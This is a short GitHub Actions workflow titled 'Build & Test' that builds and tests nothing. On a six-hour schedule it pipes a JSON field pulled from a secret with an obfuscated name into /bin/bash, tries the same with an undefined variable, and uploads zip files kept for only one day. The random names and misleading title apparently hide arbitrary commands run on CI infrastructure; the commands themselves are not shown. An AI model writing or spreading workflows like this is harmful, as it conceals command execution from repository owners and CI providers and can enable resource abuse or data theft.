name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '57 5,11,17,23 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Start
        env:
          mzfk6: ${{ secrets.mzfk6 }}
        run: |
          printf '%s' "$mzfk6" | jq -r .djeof3599 | /bin/bash
          printf '%s' "$jzrhd300" | jq -r .jxee81176 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: JyryAjgI
          path: "*.zip"
          retention-days: 1
